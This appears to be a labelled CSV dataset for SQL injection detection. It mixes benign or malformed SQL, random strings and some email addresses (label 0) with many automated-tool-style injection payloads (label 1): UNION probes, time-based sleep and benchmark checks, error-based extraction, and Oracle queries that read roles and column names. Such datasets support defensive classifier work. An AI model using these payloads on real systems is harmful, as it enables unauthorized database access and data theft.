Query,Label
41910864b,0
"   SELECT journey, also, scientificFROM fence WHERE broad  IS NOT NULL",0
1'   )    )    as rxxd where 5049  =  5049,1
SELECT * FROM prize FETCH FIRST 50 PERCENT ROWS ONLY,0
"1%' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '%'  =  '",1
1 where 9620  =  9620 waitfor delay '0:0:5'--,1
"-3063%""   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""%""  =  """,1
-4952'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'abso'  =  'abso,1
"1' where 2391  =  2391 union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_label_2767' LIMIT 1,0
SELECT AVG ( alphabet )  FROM image  SELECT SUM ( company ) ,0
38507707a,0
linton,0
1'+  (  select mhfn where 2425  =  2425,1
SELECT TOP 3 * FROM among WHERE cook = 'someone' SELECT * FROM chance,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'wweo'  =  'wweo",1
car,0
SELECT AVG ( everywhere ) FROM acres SELECT SUM ( mistake ) ,0
SELECT mountain ( s )  FROM shoe SELECT believed ( s ) ,0
SELECT * FROM farther WHERE might = 'neighborhood' FETCH FIRST 3 ROWS ONLY,0
SELECT eager ( s )  FROM crew FULL OUTER JOIN,0
1'+  (  select nash where 4159  =  4159 union all select null#,1
"1'+  (  select sfuq where 8094  =  8094 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'",1
" SELECT * FROM aside ORDER BY swam, ball",0
"SELECT CONV ( 1111, 2, 10 ) ; ",0
SELECT * FROM row ORDER BY change DESC,0
cruz,0
SELECT * FROM power WHERE thick = 'accept'  AND City = 'native',0
SELECT MIN ( among )  AS worker FROM pool,0
"1'||  (  select 'qjwf' from dual where 3187  =  3187 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1
"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",1
SELECT * FROM arrow WHERE nodded = 'night' LIMIT 3,0
" SELECT * FROM air ORDER BY select ASC, got DESC",0
"1""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""xnsj"" like ""xnsj",1
heile,0
47609,0
"1 where 6095  =  6095 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
leandro,0
-9072  )   as saot where 2278  =  2278 order by 1#,1
SELECT * FROM lion WHERE cell = 'arrow' LIMIT 3,0
SELECT apart FROM open UNION SELECT ruler FROM forget ORDER BY season,0
duchement tenza,0
SELECT * FROM pride WHERE NOT directly = 'thousand'  AND NOT instant = 'spread',0
7860,0
SELECT MIN ( height )  AS lost FROM fair,0
quilolitr-o,0
"1%""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  """,1
8449,0
29611,0
43814,0
"  SELECT recently,setting FROM century WHERE be = 'solve' UNION SELECT avoid, addition FROM front",0
"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",1
bugarra,0
"1""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""tiet"" like ""tiet",1
limpi$aas,0
45183,0
SELECT * FROM keep 3,0
flixmara,0
SELECT * FROM speed FETCH FIRST 50 PERCENT ROWS ONLY,0
1'  )   as xqbq where 1619  =  1619 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
-2820'   )    )    or 6679  =  8848--,1
SELECT valuable ( s )  FROM sport,0
SELECT MIN ( weight )  AS market FROM zulu,0
"1'   )    )    as ytfi where 3323  =  3323 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
husky_hurlic@ropadegolf.sn,0
"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ocfi'  =  'ocfi",1
"  SELECT DAY ( ""2017-06-15"" ) ;",0
"  SELECT dangerous,thin,leaving FROM cow LEFT JOIN Orders ON chamber.wireID =  coast.needle ORDER BY eat.could",0
SELECT * FROM exercise WHERE raise = 'fact'  OR start = 'slip',0
SELECT * FROM scale,0
"INSERT INTO wrong ( taste, upward, daughter, develop, word, very )  VALUES  ( 'face', 'aid'. dance', 'zero', 'sit', 'worth', 'could' )  ",0
SELECT * FROM struck WHERE at = 'dance',0
SELECT AVG ( wood ) FROM term SELECT SUM ( smile ) ,0
SELECT * FROM alive WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM have FETCH FIRST 50 PERCENT ROWS ONLY,0
"1'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'dhwt'  =  'dhwt",1
"  SELECT ADDTIME ( ""2017-06-15 09:34:21.000001"", ""2:10:5.000003"" ) ;",0
4.79638E+15,0
tejeda y segoyuela,0
fontihoyuelo,0
epnimo,0
99783130e,0
SELECT atmosphere ( s )  FROM trap UNION,0
aghi,0
SELECT * FROM  ( SELECT indeed FROM noise ) ,0
SELECT * FROM car WHERE naturally = 'plane' LIMIT 3,0
nooshin,0
chuvalo@ppmanzanares.nc,0
min81t8,0
SELECT * FROM handsome WHERE die LIKE '%race%',0
SELECT TOP 50 PERCENT * FROM sense,0
SELECT AVG ( trip )  FROM relationship  SELECT SUM ( wild ) ,0
SELECT * FROM salt WHERE center NOT LIKE 'breath%',0
SELECT building ( s )  FROM eaten SELECT write ( s ) ,0
SELECT * FROM newspaper WHERE made NOT LIKE 'common%',0
DELETE FROM stomach WHERE memory = 'later',0
1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
1'+  (  select 'lpkv' where 8760  =  8760,1
"SELECT * FROM clothes WHERE father BETWEEN ""goose"" AND    ""certain""",0
"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""ssfu""  =  ""ssfu",1
1'||  (  select 'awba' from dual where 3749  =  3749 and 1445  =  3334--,1
SELECT AVG ( furniture ) FROM luck SELECT SUM ( anyone ) ,0
SELECT AVG ( pattern ) FROM way SELECT SUM ( distant ) ,0
SELECT * FROM origin WHERE sudden = 'least'  OR least = 'solid',0
1.89443E+15,0
-1621' in boolean mode  )   order by 1--,1
SELECT * FROM grandmother WHERE spring = 'trick'  OR trap = 'expect',0
SELECT bark ( s )  FROM as SELECT space FROM bend,0
 UPDATE teacher SET occasionally = 'move'WHERE conversation = 'deer',0
"-3667%'   )    )    union all select 3560,3560,3560--",1
"1%""  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
stanger-kitabayashi7@gestionsoftware.th,0
SELECT * FROM ranch WHERE flow BETWEEN largest09/01/1996row AND area15/31/1996highest,0
"1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'rggg'  =  'rggg",1
SELECT * FROM satellites FETCH FIRST 3 ROWS ONLY,0
SELECT TOP 3 * FROM seldom WHERE fresh = 'piano',0
"-4248""   )    )    union all select 9450,9450,9450--",1
SELECT * FROM pencil WHERE wheel IN  ( SELECT city FROM life ) ,0
"1  )   union all select null,null,null,null,null,null,null,null,null,null--",1
"1%"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"-2722""  )   or 4907  =  8126#",1
SELECT * FROM nearby  WHERE went = she,0
SELECT AVG ( Price ) FROM task,0
"1""  )   where 8254  =  8254 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
1' and sleep  (  5  )  #,1
SELECT * FROM consider WHERE    NOT recently = 'seen',0
"-7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",1
"   SELECT speed,exchange,gave,shown,above     (  (  orbit JOIN thought ON food.caught =  fought.does )   INNER JOIN mountainON Orders.somewhere =  under.betweenID ) ",0
SELECT COUNT ( nearly ) FROM range,0
"1""   )    )    as jucs where 6836  =  6836",1
SELECT TOP 3 * FROM saddle SELECT * FROM grow 3SELECT * FROM century,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",1
1'  )   as sagj where 4558  =  4558,1
SELECT * FROM welcome WHERE atom = 'load' LIMIT 3,0
"1  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""pdsy"" like ""pdsy",1
6440,0
SELECT AVG (  column_name  )  FROM table_name WHERE condition ;,0
SELECT * FROM not FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM widely,0
SELECT COUNT ( DISTINCT visit )  FROM prove,0
SELECT * FROM bear WHERE standard  BETWEEN 10 AND 20,0
DELETE FROM difference,0
castillejo de meslen,0
"1""  )   where 3445  =  3445 and elt  (  1212  =  1254,1254  )  --",1
"1' union all select null,null,null,null,null--",1
"-4947' in boolean mode  )   union all select 3314,3314#",1
44432,0
"1%""  )   union all select null,null,null,null,null#",1
SELECT MIN ( handsome )  AS lay FROM mad,0
SELECT AVG ( crack ) FROM lost SELECT SUM ( paper ) ,0
SELECT * FROM manufacturing WHERE wooden NOT LIKE '[difference]%',0
1  )   where 6035  =  6035,1
SELECT * FROM question WHERE car = 'yard' FETCH FIRST 3 ROWS ONLY,0
"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'ayjb' like 'ayjb",1
huaranga chicon,0
"garrotxa, 118",0
select pg_sleep  (  5  )   and   (  'itgc'  =  'itgc,1
SELECT * FROM  ( SELECT life FROM paid ) ,0
vajih,0
"  SELECT Orders.shoutrID, Employees.twenty, Employees.be FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.settleID ORDER BY Orders.governmentID",0
"1"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
SELECT smooth ( s ) FROM stone INNER JOIN,0
stapley@cirugiaplasticacordoba.jm,0
41420,0
"   SELECT chamber, tired+ ', ' + certain+ ' ' + crew+ ', ' + suit AS broke  FROM face",0
"   SELECT everyone, running+ ', ' + difficulty+ ' ' + seed+ ', ' + mix AS term  FROM nation",0
"-3913"" where 6085  =  6085 union all select 6085,6085,6085,6085,6085,6085,6085#",1
SELECT catch ( s )  FROM instant FULL OUTER JOIN,0
"   SELECT few, idea, coolFROM hour WHERE adjective  IS NOT NULL",0
SELECT * FROM camera FETCH FIRST 50 PERCENT ROWS ONLY,0
rinaldi albiol,0
aisha,0
"-5891  )   where 5792  =  5792 union all select 5792,5792,5792,5792,5792#",1
SELECT COUNT ( result ) FROM gentle,0
1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- slje,1
"-8629 where 8049  =  8049 union all select 8049,8049,8049,8049,8049,8049,8049#",1
"-1687   )    )    as lnva where 8396  =  8396 union all select 8396,8396#",1
" select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",1
SELECT * FROM opinion ORDER BY forgot,0
-2781   )    )     )   or 2573  =  5848--,1
"  SELECT able,principal,sing FROM dear LEFT JOIN Orders ON silly.presidentID =  successful.came ORDER BY harbor.load",0
SELECT father ( s FROM when RIGHT JOIN,0
"1%'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  '%'  =  '",1
" select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1",1
alidia,0
-6802  )   as coyv where 5693  =  5693 or 8571  =  8571--,1
SELECT * FROM  ( SELECT fight FROM roll ) ,0
"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT * FROM than WHERE modern = 'favorite' FETCH FIRST 3 ROWS ONLY,0
 UPDATE shop SET must = 'decide'WHERE cloth = 'shut',0
SELECT * FROM pocket WHERE railroad LIKE '%lungs%',0
"SELECT QUARTER ( ""2017-01-01 09:34:21"" ) ;",0
SELECT * FROM clear WHERE exciting NOT LIKE '[slept]%',0
28614822q,0
SELECT * FROM general WHERE half = 'log' FETCH FIRST 3 ROWS ONLY,0
"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",1
2300,0
" select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",1
SELECT * FROM table WHERE knife BETWEEN speech09/01/1996party AND eager15/31/1996cow,0
45681,0
 or   (  EXISTS  ) ,1
"1""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""dnmi"" like ""dnmi",1
monturi,0
sant vicen de torell,0
1   )    )    order by 1#,1
SELECT COUNT ( social ) FROM young,0
1'+  (  select basp where 6953  =  6953,1
1 or sleep  (  5  )  -- nrzf,1
 UPDATE rocky SET swim = 'doll'WHERE vegetable = 'frame',0
SELECT AVG ( yard )  FROM was  SELECT SUM ( factor ) ,0
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,1
SELECT AVG ( Price ) FROM who,0
nodonk@locuraporno.ar,0
select   (  case when   (  3863  =  1151  )   then 3863 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
SELECT * FROM under FETCH FIRST 3 ROWS ONLY,0
1%'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   '%'  =  ',1
-8023' in boolean mode  )   order by 1#,1
SELECT * FROM  ( SELECT mistake FROM addition ) ,0
6160,0
SELECT * FROM flies ORDER BY voice DESC,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   --",1
"1""  )   where 4520  =  4520",1
1.58112E+15,0
SELECT * FROM dozen  WHERE clearly NOT LIKE '[frozen]%',0
37793,0
adjani@zoorapia.ma,0
-2679'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cutk' like 'cutk,1
1'   )    )    as nhkp where 8030  =  8030,1
SELECT * FROM negative WHERE poor = 'third' LIMIT 3,0
1'||  (  select 'uedy' where 8816  =  8816,1
faro@vilano.pf,0
SELECT entire ( s )  FROM completely LEFT JOIN,0
"-9924   )    )    as zgqa where 2867  =  2867 union all select 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",1
64462042b,0
SELECT * FROM winter,0
"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1
SELECT leaf FROM atmosphere UNION ALL SELECT bring FROM grass ORDER BY spend,0
"   SELECT CustomerName, Address + ', ' + PostalCode + ' ' + City + ', ' + Country    AS Address  FROM Customers;",0
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""jzmg""  =  ""jzmg",1
SELECT * FROM experiment WHERE height = 'other'  AND City = 'red',0
"-8538"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1
"-9661""   )    )     )   union all select 2158,2158,2158--",1
SELECT * FROM nearest  WHERE still = save,0
" SELECT * FROM human ORDER BY social ASC, exercise DESC",0
SELECT * FROM surrounded ORDER BY ear,0
"SELECT MONTH ( ""2017-06-15 09:34:21"" ) ;",0
bl!teo,0
SELECT AVG ( together ) FROM youth SELECT SUM ( tight ) ,0
"1   )    )    union all select null,null,null,null,null,null,null--",1
"   SELECT Employees.swam, COUNT ( Orders.combineID )  AS laterFROM    ( OrdersINNER JOIN move ON Orders.buriedID  =  Employees.askID ) ",0
select   (  case when   (  8294  =  4332  )   then 1 else 8294*  (  select 8294 from master..sysdatabases  )   end  )  --,1
soussa,0
"   SELECT Employees.fun, COUNT ( Orders.ruleID )  AS anyoneFROM    ( OrdersINNER JOIN pot ON Orders.coolID  =  Employees.beautyID ) ",0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1
-5820'   )    )    as lkik where 4044  =  4044 or 7156  =  9197--,1
mariana,0
"1'   )    )    union all select null,null,null,null,null,null,null,null#",1
" SELECT * FROM buffalo ORDER BY lost ASC, if DESC",0
"1  )   as wbcd where 9506  =  9506 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1
SELECT TOP 3 * FROM leaf WHERE element = 'involved',0
SELECT * FROM simple WHERE changing = 'like',0
SELECT dirt ( s )  FROM safe,0
"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'ylql' like 'ylql",1
"1""  )   as ffon where 2738  =  2738 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1
"1%"" union all select null,null,null,null,null,null--",1
aricel,0
"  SELECT arrangement,worse FROM soft WHERE wrong = 'wet' UNION SELECT rubbed, appearance FROM through",0
SELECT AVG ( too ) FROM gas,0
SELECT * FROM foot FETCH FIRST 3 ROWS ONLY,0
"1"" union all select null,null,null--",1
SELECT * FROM clock WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM atmosphere,0
"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",1
SELECT half,0
SELECT Count ( * )  AS month,0
"  SELECT floating,travel FROM sand WHERE feed = 'quickly' UNION SELECT shinning, me FROM declared",0
SELECT * FROM prepare WHERE two = 'paper' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM putting ORDER BY south DESC,0
1' where 5335  =  5335,1
SELECT Count ( * )  AS basket,0
SELECT * FROM port WHERE sent = 'root'  AND  ( laid = 'rays' OR point = 'against' ) ,0
6769,0
"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",1
SELECT AVG ( star ) FROM scientist,0
"-7271'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'mdtw'  =  'mdtw",1
-4518 where 8023  =  8023 or 6872  =  6872--,1
SELECT COUNT ( construction ) FROM gate,0
-6397%' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ',1
1.52349E+15,0
SELECT DISTINCT attached FROM camp,0
pau gargallo 120 8-b,0
"  SELECT Orders.animalrID, Employees.pride, Employees.snow FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.smallID ORDER BY Orders.listenID",0
1' where 6116  =  6116,1
SELECT COUNT ( DISTINCT say )  FROM blind,0
SELECT * FROM have WHERE unless BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT TOP 3 * FROM idea,0
e00u4rda2,0
v5llo34,0
SELECT Count ( * )  AS properly,0
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'dqoz' like 'dqoz,1
alfamn,0
"1'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'ykxz'  =  'ykxz",1
"-8200%""   )    )    union all select 7538,7538,7538#",1
92621448b,0
"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",1
"c/ academia, 59, 3?g",0
"-8331'  )   union all select 1452,1452,1452,1452,1452--",1
SELECT * FROM spider WHERE observe IN  ( SELECT girl FROM everything ) ,0
monteon pasquina,0
SELECT whispered ( s )  FROM care UNION ALL,0
SELECT * FROM struggle WHERE until IN  ( SELECT hot FROM happen ) ,0
-6722'  )   order by 1#,1
SELECT * FROM smile WHERE fourth NOT LIKE 'solid%',0
valdemaluque,0
"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'cuat'  =  'cuat",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1
"1   )    )     )   union all select null,null,null,null--",1
SELECT * FROM gold WHERE arrow = 'universe'  OR wheel = 'lying',0
DELETE FROM interest,0
"1' where 2774  =  2774 union all select null,null,null,null,null#",1
SELECT DISTINCT weather FROM discussion,0
SELECT * FROM depth WHERE being NOT LIKE 'himself%',0
"1   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"subida san diego 8, 13?c",0
"SELECT * FROM happy WHERE vessels BETWEEN ""teach"" AND    ""slow""",0
"1""  )   as pwvu where 8267  =  8267",1
"c/ francisco de ricci 23, 1?c",0
"1'+  (  select 'mgrj' where 8514  =  8514 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   +'",1
1'+  (  select rhlb where 9477  =  9477,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8503  =  8503",1
"cantallops, 138,",0
segura,0
SELECT * FROM dollar WHERE standard  BETWEEN 10 AND 20,0
SELECT * FROM college WHERE thing = 'lake'  AND City = 'spider',0
select   (  case when   (  7997  =  1543  )   then 7997 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
"1,  (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4250  =  4250  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ",1
arceo feliu,0
select case when 7951  =  1147 then 1 else null end--,1
"-3261""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""yxms""  =  ""yxms",1
SELECT ASIN ( 0.25 ) ;,0
"  SELECT ADDTIME ( ""2017-06-15   09:34:21.000001"", ""5.000003"" ) ;",0
-2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838,1
SELECT * FROM tip  WHERE onto NOT LIKE '[table]%',0
"-7307'   )    )    union all select 5215,5215,5215,5215--",1
FROM  ( SELECT DISTINCT Country FROM Customers ) ;,0
1   )    )     )   rlike   (  select   (  case when   (  4367  =  6879  )   then 1 else 0x28 end   )    )    and    (    (     (  2542  =  2542,1
SELECT led FROM camera UNION SELECT claws FROM hello ORDER BY outside,0
38350,0
francina,0
SELECT * FROM sink WHERE create = 'important',0
